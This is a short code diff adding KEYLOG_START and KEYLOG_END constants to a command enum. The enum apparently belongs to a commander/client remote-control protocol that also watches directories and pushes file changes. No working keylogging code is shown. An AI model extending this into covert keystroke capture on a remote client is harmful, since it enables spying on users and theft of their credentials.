@@ -36,6 +36,8 @@ class CommandType(IntEnum):
     FILE_WATCH = 0x6789  # start watching a directory; push changes to commander
     FILE_DELETE = 0x7890  # notify commander to delete a file from received_files/
     STOP_WATCH = 0x8901  # commander � client: stop the file watcher
+    KEYLOG_START = 0x9012
+    KEYLOG_END = 0x0123
     ACK = 0x9ABC
     ERROR = 0xABCD
 
